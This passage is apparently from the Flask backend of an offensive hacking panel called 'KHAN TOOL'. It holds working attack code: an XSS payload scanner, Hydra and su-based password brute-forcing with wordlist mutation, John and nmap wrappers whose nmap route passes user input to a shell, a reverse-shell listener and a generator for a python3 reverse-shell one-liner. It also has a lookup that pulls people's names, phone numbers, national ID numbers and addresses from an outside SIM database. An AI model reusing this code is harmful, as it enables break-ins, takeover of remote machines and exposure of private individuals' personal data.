                    # Check if angle brackets are not encoded
                    if '&lt;' not in resp.text[:500]:
                        is_vulnerable = True
                        reflected_in = 'html_tags_injected'
            # JavaScript event handlers
            elif 'onerror=' in payload.lower() and 'onerror=' in resp.text.lower():
                is_vulnerable = True
                reflected_in = 'event_handler'
            
            if is_vulnerable:
                vulnerable_count += 1
                results.append({
                    'payload': payload,
                    'vulnerable': True,
                    'reflected_in': reflected_in,
                    'status_code': resp.status_code,
                    'response_length': len(resp.text)
                })
            else:
                results.append({
                    'payload': payload,
                    'vulnerable': False
                })
        except Exception as e:
            results.append({
                'payload': payload,
                'vulnerable': False,
                'error': str(e)
            })
    
    return jsonify({
        'status': 'success',
        'target': target_url,
        'payloads_tested': len(payloads_to_test),
        'vulnerable_payloads': vulnerable_count,
        'results': results
    })

def inject_payload(url, payload):
    """Inject payload into the first parameter of URL"""
    if '=' not in url:
        return url + '?q=' + payload
    
    # Find first parameter and replace its value
    parts = url.split('=', 1)
    if '&' in parts[1]:
        remaining = parts[1].split('&', 1)[1]
        return parts[0] + '=' + payload + '&' + remaining
    else:
        return parts[0] + '=' + payload








# ================= HYDRA TOOL (PROFESSIONAL) =================
# Global state for Hydra
hydra_current_process = None
hydra_stop_event = threading.Event()

# ---- WORDLIST GENERATORS ----
def generate_smart_wordlist(base_wordlist_path, mode='dictionary'):
    """Generate enhanced wordlist based on mode"""
    output_path = base_wordlist_path + '.enhanced'
    
    try:
        with open(base_wordlist_path, 'r', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
    except:
        words = ['password', '123456', 'admin', 'root', 'toor']
    
    enhanced = set(words)
    
    if mode in ('smart', 'hybrid'):
        for w in words[:3000]:
            enhanced.add(w.capitalize())
            enhanced.add(w.upper())
            enhanced.add(w + '123')
            enhanced.add(w + '2024')
            enhanced.add(w + '2025')
            enhanced.add(w + '!')
            enhanced.add(w + '@')
            enhanced.add('@' + w)
            enhanced.add('!' + w)
            for old, new in [('a', '@'), ('e', '3'), ('i', '1'), ('o', '0'), ('s', '$')]:
                if old in w:
                    enhanced.add(w.replace(old, new))
            if len(w) >= 3:
                enhanced.add(w[::-1])
    
    if mode == 'hybrid':
        common_suffixes = ['khan', 'hacker', '786', '007', '1234', 'pass', 'admin']
        base_words = list(words)[:200] if len(words) > 200 else words
        for w in base_words:
            for s in common_suffixes:
                enhanced.add(w + s)
                enhanced.add(s + w)
    
    common = ['password', '123456', '12345678', 'qwerty', 'admin', 'root',
              'letmein', 'welcome', 'dragon', 'master', 'khan', 'hacker',
              'password123', 'admin123', 'root123', 'test', 'test123',
              'toor', 'changeme', 'default', 'guest', 'user']
    enhanced.update(common)
    
    with open(output_path, 'w') as f:
        f.write('\n'.join(enhanced))
    
    return output_path

def generate_fallback_wordlist(username, count=10000):
    """Generate smart wordlist from username"""
    path = f'/tmp/hydra_fallback_{username}_{int(time.time())}.txt'
    passwords = set()
    
    base = username.lower()
    passwords.add(base)
    passwords.add(base + '123')
    passwords.add(base.capitalize())
    passwords.add(base.upper())
    passwords.add(base + '!')
    passwords.add(base + '@')
    passwords.add(base + '2024')
    passwords.add(base + '2025')
    if len(base) > 2:
        passwords.add(base[::-1])
    
    common_list = [
        'password', '123456', '12345678', 'qwerty', 'admin', 'root',
        'letmein', 'welcome', 'dragon', 'master', 'passw0rd',
        'admin123', 'root123', 'test', 'test123', 'pass123',
        'khan', 'hacker', 'khan-hacker', '786', '007',
        'iloveyou', 'sunshine', 'football', 'baseball',
        'qwerty123', '1q2w3e4r', 'changeme', 'default'
    ]
    passwords.update(common_list)
    
    for i in range(0, min(200, count // 10)):
        passwords.add(f"{base}{i}")
    
    for year in ['2024', '2025', '2026']:
        passwords.add(base + year)
        passwords.add(year + base)
    
    password_list = list(passwords)[:count]
    with open(path, 'w') as f:
        f.write('\n'.join(password_list))
    
    return path

# ---- LOCAL PASSWORD CRACKING ----
def local_brute_force_su(username, wordlist_path, callback=None):
    """Brute force local password using `su` command"""
    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    total = len(passwords)
    for i, password in enumerate(passwords):
        if hydra_stop_event.is_set():
            return {'status': 'stopped', 'found': False}
        if callback:
            callback(i + 1, total, password)
        try:
            proc = subprocess.Popen(
                ['su', username, '-c', 'echo SUCCESS'],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            stdout, stderr = proc.communicate(input=password + '\n', timeout=3)
            if 'SUCCESS' in stdout:
                return {'status': 'success', 'found': True, 'password': password}
        except:
            pass
    return {'status': 'success', 'found': False, 'password': None}

def local_brute_force(username, wordlist_path, mode='dictionary', callback=None):
    actual_wordlist = wordlist_path
    if mode in ('smart', 'hybrid') and os.path.exists(wordlist_path):
        actual_wordlist = generate_smart_wordlist(wordlist_path, mode)
    elif not os.path.exists(wordlist_path):
        actual_wordlist = generate_fallback_wordlist(username)
    if not os.path.exists(actual_wordlist):
        return {'status': 'error', 'message': f'Wordlist not found: {actual_wordlist}'}
    return local_brute_force_su(username, actual_wordlist, callback)

# ---- HYDRA STOP ROUTE ----
@app.route('/api/stop-hydra', methods=['POST'])
def stop_hydra():
    global hydra_current_process
    hydra_stop_event.set()
    if hydra_current_process and hydra_current_process.poll() is None:
        hydra_current_process.terminate()
        try:
            hydra_current_process.wait(timeout=3)
        except:
            hydra_current_process.kill()
        hydra_current_process = None
    return jsonify({'status': 'stopped'})

# ---- HYDRA RUN ROUTE ----
@app.route('/api/run-hydra', methods=['POST'])
def run_hydra():
    global hydra_current_process
    hydra_stop_event.clear()
    
    data = request.get_json()
    
    # Get parameters
    target = data.get('target', '127.0.0.1')
    wordlist = data.get('wordlist', '')
    service = data.get('service', 'ssh')
    port = data.get('port', '')
    attack_mode = data.get('mode', 'dictionary')
    host = data.get('host', target)
    
    # Username handling - support both single and list
    username_single = data.get('user', '')
    username_list = data.get('username_list', '')
    
    # Validate wordlist
    if not wordlist:
        return jsonify({'status': 'error', 'message': 'Password wordlist required'}), 400
    
    # Validate username (either single or list)
    use_username_list = False
    username_arg = ""
    
    if username_list and os.path.exists(username_list):
        use_username_list = True
        username_arg = f"-L {username_list}"
        user_display = f"username list ({username_list})"
    elif username_single:
        use_username_list = False
        username_arg = f"-l {username_single}"
        user_display = f"'{username_single}'"
    else:
        return jsonify({'status': 'error', 'message': 'Username or username list required'}), 400
    
    # ================= LOCAL PASSWORD CRACKING =================
    if service in ('local_unix', 'local_windows'):
        # For local cracking, only single username is supported
        if use_username_list:
            return jsonify({'status': 'error', 'message': 'Username list not supported for local cracking. Use single username.'}), 400
        
        actual_wordlist = wordlist
        if attack_mode in ('smart', 'hybrid') and os.path.exists(wordlist):
            actual_wordlist = generate_smart_wordlist(wordlist, attack_mode)
        elif not os.path.exists(wordlist):
            actual_wordlist = generate_fallback_wordlist(username_single)
        
        if not os.path.exists(actual_wordlist):
            return jsonify({'status': 'error', 'message': f'Wordlist not found: {actual_wordlist}'}), 400
        
        with open(actual_wordlist, 'r') as f:
            word_count = sum(1 for _ in f)
        
        output_lines = [
            f"[*] LOCAL ATTACK on '{username_single}'",
            f"[*] Wordlist: {actual_wordlist} ({word_count} passwords)",
            f"[*] Mode: {attack_mode.upper()}",
        ]
        
        def progress_callback(current, total, password):
            if current % max(1, total // 50) == 0 or current == 1:
                pct = int((current / total) * 100)
                output_lines.append(f"[{pct}%] Trying ({current}/{total}): {password[:30]}...")
        
        result = local_brute_force(username_single, wordlist, attack_mode, progress_callback)
        
        if result.get('found'):
            output_lines.append(f"\n{'='*50}")
            output_lines.append(f"✅ PASSWORD FOUND for '{username_single}': {result.get('password')}")
            output_lines.append(f"{'='*50}")
            return jsonify({'status': 'success', 'output': '\n'.join(output_lines), 'found': True, 'password': result.get('password'), 'found_user': username_single})
        elif result.get('status') == 'stopped':
            output_lines.append("\n[!] Attack stopped by user")
            return jsonify({'status': 'stopped', 'output': '\n'.join(output_lines), 'found': False})
        else:
            output_lines.append(f"\n[-] Password for '{username_single}' NOT FOUND")
            return jsonify({'status': 'success', 'output': '\n'.join(output_lines), 'found': False})
    
    # ================= REMOTE SERVICES =================
    if not os.path.exists(wordlist):
        return jsonify({'status': 'error', 'message': f'Password wordlist not found: {wordlist}'}), 400
    
    # Get actual host and port
    actual_host = host if host != target else target
    port_arg = port
    if ':' in actual_host and not port:
        parts = actual_host.split(':')
        actual_host = parts[0]
        port_arg = parts[1]
    
    # ================= HTTP POST FORM (WEBSITE LOGIN) =================
    if service in ('http-post-form', 'https-post-form'):
        # target contains form string from frontend
        form_string = target
        host_ip = actual_host
        
        # Build command with username support
        cmd = f"hydra {username_arg} -P {wordlist} {host_ip} {service} \"{form_string}\""
        if port_arg:
            cmd += f" -s {port_arg}"
        cmd += " -t 4 -I -V -f -w 30"
    
    # ================= OTHER SERVICES (SSH, FTP, etc.) =================
    else:
        if port_arg:
            cmd = f"hydra {username_arg} -P {wordlist} {actual_host} -s {port_arg} -t 4 -I -V -f -w 30 {service}"
        else:
            cmd = f"hydra {username_arg} -P {wordlist} {actual_host} -t 4 -I -V -f -w 30 {service}"
    
    print(f"[DEBUG] Running command: {cmd}")
    
    try:
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        hydra_current_process = process
        
        output_lines = [f"[>] Command: {cmd}"]
        found_password = None
        found_user = None
        
        for line in iter(process.stdout.readline, ''):
            print(line.strip())
            output_lines.append(line.strip())
            
            # Detect found credentials
            if 'password:' in line.lower() and 'host:' in line.lower():
                match_pass = re.search(r'password:\s*(\S+)', line, re.IGNORECASE)
                if match_pass:
                    found_password = match_pass.group(1)
                # Also try to extract username
                match_user = re.search(r'login:\s*(\S+)', line, re.IGNORECASE)
                if match_user:
                    found_user = match_user.group(1)
            
            if hydra_stop_event.is_set():
                process.terminate()
                break
        
        process.stdout.close()
        process.wait()
        hydra_current_process = None
        
        if hydra_stop_event.is_set():
            return jsonify({'status': 'stopped', 'output': '\n'.join(output_lines), 'found': False})
        
        final_output = '\n'.join(output_lines) if output_lines else 'Hydra completed.'
        
        return jsonify({
            'status': 'success',
            'output': final_output,
            'found': found_password is not None,
            'password': found_password,
            'found_user': found_user
        })
        
    except FileNotFoundError:
        return jsonify({'status': 'error', 'message': 'Hydra not installed. Run: sudo apt install hydra'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/generate-wordlist', methods=['POST'])
def generate_wordlist():
    data = request.get_json()
    username = data.get('username', '')
    if not data or not username:
        return jsonify({'status': 'error', 'message': 'Username required'}), 400
    count = min(int(data.get('count', 10000)), 50000)
    path = generate_fallback_wordlist(username, count)
    return jsonify({'status': 'success', 'path': path, 'count': count, 'message': f'Generated wordlist with {count} passwords'})

@app.route('/api/check-hydra', methods=['GET'])
def check_hydra():
    try:
        subprocess.run(['hydra', '-h'], capture_output=True, text=True, timeout=5)
        return jsonify({'status': 'success', 'installed': True})
    except:
        return jsonify({'status': 'success', 'installed': False})
        




# ================= HYDRA, JOHN, NMAP =================


@app.route('/api/run-john', methods=['POST'])
def run_john():
    data = request.get_json()
    hashfile = sanitize_command_arg(data.get('hashfile', ''))
    format_type = sanitize_command_arg(data.get('format', ''))
    wordlist = sanitize_command_arg(data.get('wordlist', ''))
    if not hashfile:
        return jsonify({'status': 'error', 'message': 'Hash file path required'}), 400
    if not os.path.exists(hashfile):
        return jsonify({'status': 'error', 'message': f'Hash file not found: {hashfile}'}), 400
    pot_file = '/tmp/john.pot'
    def get_cracked_password(hash_file, format_type):
        try:
            show_cmd = f"john --show --pot={pot_file} {hash_file}"
            if format_type and format_type != 'auto':
                show_cmd += f" --format={format_type}"
            result = subprocess.run(shlex.split(show_cmd), capture_output=True, text=True)
            output = result.stdout.strip()
            if 'password hashes cracked' in output:
                return None
            for line in output.split('\n'):
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2 and parts[1].strip():
                        return parts[1].strip()
                elif line.strip() and not line.startswith('Loaded'):
                    return line.strip()
            return None
        except:
            return None
    existing_password = get_cracked_password(hashfile, format_type)
    if existing_password:
        return jsonify({'status': 'success', 'output': f'✅ Hash already cracked!\nPassword: {existing_password}'})
    cmd = f"john --pot={pot_file} {hashfile}"
    if format_type and format_type != 'auto':
        cmd += f" --format={format_type}"
    if wordlist:
        cmd += f" --wordlist={wordlist}"
    cmd_list = shlex.split(cmd)
    try:
        process = subprocess.Popen(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        output_lines = []
        for line in iter(process.stdout.readline, ''):
            print(line.strip())
            output_lines.append(line.strip())
        process.stdout.close()
        process.wait()
        cracked = get_cracked_password(hashfile, format_type)
        final_output = "\n".join(output_lines)
        if not final_output.strip():
            final_output = "John completed."
        if cracked:
            final_output += f"\n\n✅ Cracked password: {cracked}"
        else:
            final_output += "\n\n⚠️ No password cracked (maybe wordlist missing or hash not in pot)."
        return jsonify({'status': 'success', 'output': final_output})
    except FileNotFoundError:
        return jsonify({'status': 'error', 'message': 'John not installed. Install: sudo apt install john'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ================= NMAP SCANNER ROUTE =================
@app.route('/api/run-nmap', methods=['POST'])
def run_nmap():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON data'}), 400
        
        target = data.get('target', '').strip()
        options = data.get('options', '').strip()
        full_command = data.get('full_command', '').strip()
        
        # Case 1: Full command diya hai
        if full_command:
            if not full_command.lower().startswith('nmap'):
                return jsonify({'status': 'error', 'message': 'Full command must start with nmap'}), 400
            cmd = full_command
        
        # Case 2: Target diya hai
        elif target:
            if options:
                cmd = f"nmap {options} {target}"
            else:
                cmd = f"nmap {target}"
        
        # Case 3: Kuch bhi nahi diya
        else:
            return jsonify({'status': 'error', 'message': 'Target or full command required'}), 400
        
        print(f"[NMAP] Running: {cmd}")
        
        # Run nmap command
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
        
        # Output le lo (stdout ya stderr)
        output = result.stdout if result.stdout else result.stderr
        
        if not output.strip():
            output = "Nmap scan completed (no output)."
        
        return jsonify({'status': 'success', 'output': output})
    
    except subprocess.TimeoutExpired:
        return jsonify({'status': 'error', 'message': 'Nmap scan timed out (180 seconds)'}), 500
    except FileNotFoundError:
        return jsonify({'status': 'error', 'message': 'Nmap not installed. Run: sudo apt install nmap -y'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/load-wordlist', methods=['POST'])
def load_wordlist():
    data = request.get_json()
    path = data.get('path', '')
    if not os.path.exists(path):
        return jsonify({'status': 'error', 'message': 'File not found'}), 404
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        return jsonify({'status': 'success', 'passwords': lines[:100]})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ================= REVERSE SHELL (SIMPLE) =================
reverse_conn = None
reverse_lock = threading.Lock()
reverse_buffer = ""
reverse_buffer_lock = threading.Lock()
reverse_active = False

@app.route('/api/reverse/start', methods=['POST'])
def rev_start():
    global reverse_conn, reverse_active, reverse_buffer
    data = request.get_json()
    port = int(data.get('port', 4444))
    
    if reverse_active:
        return jsonify({'status': 'error', 'message': 'Already running'})
    
    def listener():
        global reverse_conn, reverse_active, reverse_buffer
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(1)
        reverse_active = True
        print(f"[RS] Listening on {port}")
        
        conn, addr = s.accept()
        with reverse_lock:
            reverse_conn = conn
        print(f"[RS] Connected from {addr}")
        
        with reverse_buffer_lock:
            reverse_buffer = ""
        
        while reverse_active:
            try:
                d = conn.recv(4096)
                if not d: break
                with reverse_buffer_lock:
                    reverse_buffer += d.decode('utf-8', errors='replace')
            except:
                break
        
        with reverse_lock:
            reverse_conn = None
        reverse_active = False
        s.close()
    
    threading.Thread(target=listener, daemon=True).start()
    return jsonify({'status': 'success', 'message': f'Started on port {port}'})

@app.route('/api/reverse/stop', methods=['POST'])
def rev_stop():
    global reverse_active, reverse_conn
    reverse_active = False
    with reverse_lock:
        if reverse_conn:
            try:
                reverse_conn.close()
            except:
                pass
            reverse_conn = None
    return jsonify({'status': 'success'})

@app.route('/api/reverse/generate', methods=['POST'])
def rev_generate():
    data = request.get_json()
    ip = data.get('ip', '')
    port = data.get('port', 4444)
    return jsonify({
        'status': 'success',
        'payloads': {
            'python3': f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\''
        }
    })

@app.route('/api/reverse/send', methods=['POST'])
def rev_send():
    global reverse_buffer
    data = request.get_json()
    cmd = data.get('cmd', '')
    
    with reverse_lock:
        if not reverse_conn:
            return jsonify({'status': 'error', 'message': 'No connection'})
        reverse_conn.sendall(cmd.encode() + b'\n')
    
    time.sleep(0.3)
    with reverse_buffer_lock:
        out = reverse_buffer
        reverse_buffer = ""
    
    return jsonify({'status': 'success', 'output': out if out else '[+] Done'})

@app.route('/api/reverse/status', methods=['GET'])
def rev_status():
    with reverse_lock:
        connected = reverse_conn is not None
    return jsonify({'connected': connected, 'listener_active': reverse_active})


# ================= SIM DB / CNIC =================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'sim_logs.db')

def init_sim_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS search_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_ip TEXT NOT NULL,
            search_query TEXT NOT NULL,
            results_found INTEGER DEFAULT 0,
            timestamp TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('CREATE INDEX IF NOT EXISTS idx_user_ip ON search_logs (user_ip)')
    c.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON search_logs (timestamp)')
    conn.commit()
    conn.close()

def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def log_search(query, results_found):
    ip = get_client_ip()
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('INSERT INTO search_logs (user_ip, search_query, results_found, timestamp) VALUES (?, ?, ?, ?)',
                  (ip, query, results_found, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"DB log error: {e}")
        os.makedirs('logs', exist_ok=True)
        with open(f'logs/search_logs_{datetime.now().strftime("%Y-%m-%d")}.txt', 'a') as f:
            f.write(json.dumps({'ip': ip, 'query': query, 'results': results_found, 'ts': str(datetime.now())}) + '\n')

def get_total_checks():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM search_logs WHERE results_found > 0')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_total_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT COUNT(DISTINCT user_ip) FROM search_logs WHERE user_ip IS NOT NULL AND user_ip != "0.0.0.0"')
    count = c.fetchone()[0]
    conn.close()
    return count

init_sim_db()

def detect_network(phone_str):
    if not phone_str or phone_str == 'N/A':
        return 'Unknown'
    num = ''.join(filter(str.isdigit, phone_str))
    if len(num) >= 4:
        prefix = num[:4]
        if prefix >= '0300' and prefix <= '0309': return 'Jazz'
        if prefix >= '0310' and prefix <= '0319': return 'Zong'
        if prefix >= '0320' and prefix <= '0329': return 'Jazz'
        if prefix >= '0330' and prefix <= '0339': return 'Ufone'
        if prefix >= '0340' and prefix <= '0349': return 'Telenor'
    return 'Unknown'

WORKING_API_URL = "https://sim-api.fakcloud.tech?q={}"
def query_simdb_api(query_str):
    try:
        url = WORKING_API_URL.format(query_str)
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        resp = requests.get(url, timeout=15, headers=headers)
        if resp.status_code != 200:
            return None
        data = resp.json()
        if data.get('success') and 'data' in data:
            records = data['data'].get('records', [])
            if records:
                normalized = []
                for rec in records:
                    normalized.append({
                        'full_name': rec.get('full_name', 'N/A'),
                        'phone': rec.get('phone', 'N/A'),
                        'cnic': rec.get('cnic', 'N/A'),
                        'address': rec.get('address', 'N/A')
                    })
                return normalized
        return None
    except Exception as e:
        print(f"API error: {e}")
        return None

@app.route('/simdb', methods=['GET', 'POST'])
def simdb():
    query = ''
    result = None
    error = None
    api_used = None
    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            query = data.get('query', '').strip()
        else:
            query = request.form.get('query', '').strip()
        if not query:
            error = "Please enter a phone number or CNIC."
        elif not query.isdigit() or not (10 <= len(query) <= 13):
            error = "Please enter a valid 10-13 digit phone number or 13-digit CNIC."
        else:
            records = query_simdb_api(query)
            if records is None and len(query) == 11 and query.startswith('0'):
                records = query_simdb_api(query[1:])
            if records is None and len(query) == 10:
                records = query_simdb_api('0' + query)
            if records:
                result = records
                api_used = "sim-api.fakcloud.tech"
                log_search(query, len(result))
            else:
                error = "No records found. Check the number/CNIC and try again."
        if request.is_json:
            return jsonify({
                'status': 'success' if result else 'error',
                'result': result,
                'error': error,
                'api_used': api_used,
                'total_checks': get_total_checks(),
                'total_users': get_total_users()
            })
    total_checks = get_total_checks()
    total_users = get_total_users()
    return render_template('simdb.html', query=query, result=result, error=error,
                           total_checks=total_checks, total_users=total_users)

@app.route('/cnic-search', methods=['GET', 'POST'])
def cnic_search():
    query = ''
    result = None
    error = None
    api_used = None
    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            query = data.get('query', '').strip()
        else:
            query = request.form.get('query', '').strip()
        if not query:
            error = "Please enter a CNIC number."
        elif not query.isdigit() or len(query) != 13:
            error = "Please enter a valid 13-digit CNIC."
        else:
            records = query_simdb_api(query)
            if records:
                sim_list = []
                for rec in records:
                    sim_list.append({'Mobile': rec['phone'], 'Network': detect_network(rec['phone'])})
                result = sim_list
                api_used = "sim-api.fakcloud.tech"
                log_search(query, len(result))
            else:
                error = "No SIMs found for this CNIC."
        if request.is_json:
            return jsonify({
                'status': 'success' if result else 'error',
                'result': result,
                'error': error,
                'api_used': api_used
            })
    return render_template('cnic-search.html', query=query, result=result, error=error)

@app.route('/api/simdb/stats', methods=['GET'])
def simdb_stats():
    return jsonify({'total_users': get_total_users(), 'total_checks': get_total_checks()})

# ================= 2FA =================
@app.route('/api/2fa/generate', methods=['POST'])
def generate_2fa():
    data = request.get_json()
    email = sanitize_input(data.get('email', ''))
    if not email or not validate_email(email):
        return jsonify({'status': 'error', 'message': 'Valid email required'}), 400
    otp = generate_otp()
    session['2fa_otp'] = otp
    session['2fa_otp_expires'] = time.time() + 300
    session['2fa_email'] = email
    subject = "🔐 KHAN TOOL - Two-Factor Authentication OTP"
    body = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="background:#0a0a0a;font-family:'Courier New',monospace;"><div style="max-width:600px;margin:20px auto;background:#000;border:2px solid #0f0;border-radius:20px;padding:25px;"><h1 style="color:#0f0;">⚔️ KHAN TOOL 2FA ⚔️</h1><p>Your OTP is:</p><div style="background:#111;padding:15px;text-align:center;"><span style="font-size:42px;font-weight:bold;color:#FFD700;">{otp}</span></div><p>Expires in 5 minutes.</p></div></body></html>"""
    success = send_email_with_failover(email, subject, body)
    if success:
        return jsonify({'status': 'success', 'message': 'OTP sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send OTP'}), 500

@app.route('/api/2fa/verify', methods=['POST'])
def verify_2fa():
    data = request.get_json()
    user_otp = data.get('otp', '').strip()
    stored_otp = session.get('2fa_otp')
    expires = session.get('2fa_otp_expires', 0)
    if not stored_otp:
        return jsonify({'status': 'error', 'message': 'No OTP generated. Click "Send OTP" first.'}), 400
    if time.time() > expires:
        session.pop('2fa_otp', None)
        session.pop('2fa_otp_expires', None)
        return jsonify({'status': 'error', 'message': 'OTP expired. Generate a new one.'}), 400
    if user_otp == stored_otp:
        session.pop('2fa_otp', None)
        session.pop('2fa_otp_expires', None)
        return jsonify({'status': 'success', 'message': '✅ 2FA Verified! Access granted (demo).'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid OTP. Try again.'}), 400

# ================= PASSWORD CHECKER & BLACKLIST =================
import hashlib

ROCKYOU_PATH = "/usr/share/wordlists/rockyou.txt"
CUSTOM_WORDLIST_PATH = "uploads/password_lists/"
os.makedirs(CUSTOM_WORDLIST_PATH, exist_ok=True)

def check_hibp(password):
    try:
        sha1_hash = hashlib.sha1(password.encode()).hexdigest().upper()
        prefix = sha1_hash[:5]
        suffix = sha1_hash[5:]
        response = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
        if response.status_code == 200:
            for line in response.text.splitlines():
                hash_suffix, count = line.split(':')
                if hash_suffix == suffix:
                    return int(count)
        return 0
    except:
        return -1

def check_rockyou(password, wordlist_path=ROCKYOU_PATH):
    if not os.path.exists(wordlist_path):
        return False, "rockyou.txt not found"
    try:
        with open(wordlist_path, 'r', encoding='latin-1', errors='ignore') as f:
            for line in f:
                if line.strip() == password:
                    return True, "Found in RockYou (14M breached passwords)"
        return False, "Not found in RockYou"
    except Exception as e:
        return False, f"Error: {str(e)}"

def check_common_patterns(password):
    common_passwords = {
        'password': 'Most common password',
        '123456': 'Most common numeric pattern',
        '123456789': 'Sequential numbers',
        'qwerty': 'Keyboard pattern',
        'abc123': 'Simple pattern',
        'admin': 'Default admin password',
        'welcome': 'Common welcome password',
        'letmein': 'Common phrase',
        '111111': 'Repeated numbers',
        'password123': 'Password + numbers'
    }
    if password.lower() in common_passwords:
        return True, common_passwords[password.lower()]
    patterns = [
        (r'^[a-zA-Z]+$', 'Only letters - too simple'),
        (r'^[0-9]+$', 'Only numbers - easily guessable'),
        (r'(.)\1{3,}', f'Repeated character "{password[0]}" - weak pattern'),
        (r'^[a-z]+\d+$', 'Letters followed by numbers - common pattern'),
        (r'^[A-Z][a-z]+\d+$', 'Capital + lowercase + numbers - common pattern'),
    ]
    for pattern, message in patterns:
        if re.match(pattern, password):
            return True, message
    return False, None

BLACKLIST_PATH = "password.txt"
def check_password_blacklist(password):
    if not os.path.exists(BLACKLIST_PATH):
        return False
    try:
        with open(BLACKLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if line.strip().lower() == password.lower():
                    return True
    except:
        pass
    return False

@app.route('/api/check-blacklist', methods=['POST'])
def api_check_blacklist():
    data = request.get_json()
    password = data.get('password', '')
    if not password:
        return jsonify({'status': 'error', 'message': 'Password required'}), 400
    is_blacklisted = check_password_blacklist(password)
    return jsonify({'is_blacklisted': is_blacklisted})

@app.route('/api/analyze-password', methods=['POST'])
def analyze_password():
    data = request.get_json()
    password = data.get('password', '')
    if not password:
        return jsonify({'status': 'error', 'message': 'Password required'}), 400

    results = {
        'password': password,
        'length': len(password),
        'hibp_count': 0,
        'rockyou_found': False,
        'common_pattern': False,
        'pattern_message': None,
        'suggestions': []
    }

    hibp_count = check_hibp(password)
    results['hibp_count'] = hibp_count

    rockyou_found, rockyou_msg = check_rockyou(password)
    results['rockyou_found'] = rockyou_found
    if rockyou_found:
        results['suggestions'].append('❌ This password appears in RockYou breach database!')

    pattern_found, pattern_msg = check_common_patterns(password)
    results['common_pattern'] = pattern_found
    results['pattern_message'] = pattern_msg
    if pattern_found:
        results['suggestions'].append(f'⚠️ Weak pattern detected: {pattern_msg}')

    if hibp_count > 0:
        results['suggestions'].append(f'🔥 Found in {hibp_count} data breaches!')

    if len(password) < 12:
        results['suggestions'].append('📏 Use at least 12 characters')
    if not re.search(r'[A-Z]', password):
        results['suggestions'].append('🔠 Add uppercase letters')
    if not re.search(r'[a-z]', password):
        results['suggestions'].append('🔡 Add lowercase letters')
    if not re.search(r'[0-9]', password):
        results['suggestions'].append('🔢 Add numbers')
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        results['suggestions'].append('✨ Add special characters (!@#$%^&*)')

    score = 100
    if hibp_count > 0:
        score -= 50
    if rockyou_found:
        score -= 30
    if pattern_found:
        score -= 20
    if len(password) < 8:
        score -= 20
    elif len(password) < 12:
        score -= 10
    score = max(0, min(100, score))
    results['score'] = score

    if score >= 80:
        results['strength'] = 'STRONG'
    elif score >= 50:
        results['strength'] = 'MODERATE'
    else:
        results['strength'] = 'WEAK'

    return jsonify(results)

@app.route('/api/upload-wordlist-password', methods=['POST'])
def upload_wordlist_password():
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file uploaded'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No file selected'}), 400
    filename = secure_filename(f"user_{int(time.time())}_{file.filename}")
    filepath = os.path.join(CUSTOM_WORDLIST_PATH, filename)
    file.save(filepath)
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        line_count = sum(1 for _ in f)
    return jsonify({'status': 'success', 'filename': filename, 'line_count': line_count, 'message': f'Uploaded {line_count} passwords'})


# ================= TELEGRAM 2FA ROUTES =================
telegram_phone_storage = {}

@app.route('/api/telegram/save-phone', methods=['POST'])
def telegram_save_phone():
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        if not phone or not phone.startswith('+') or len(phone) < 10:
            return jsonify({'status': 'error', 'message': 'Invalid phone number'}), 400
        otp = generate_otp()
